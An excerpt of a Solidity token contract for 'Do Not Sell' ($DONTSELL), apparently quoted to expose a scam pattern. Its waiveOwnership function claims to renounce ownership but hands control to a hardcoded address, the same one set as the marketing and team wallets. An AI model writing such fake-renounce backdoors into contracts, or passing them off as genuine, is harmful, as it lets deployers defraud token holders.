...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x20c31b871168F7cDB50a5B7DF5270B6878c659bC);
    }
...
contract DoNotSell is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Do Not Sell";
    string private _symbol = "$DONTSELL";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x20c31b871168F7cDB50a5B7DF5270B6878c659bC);
    address payable private teamWalletAddress = payable(0x20c31b871168F7cDB50a5B7DF5270B6878c659bC);
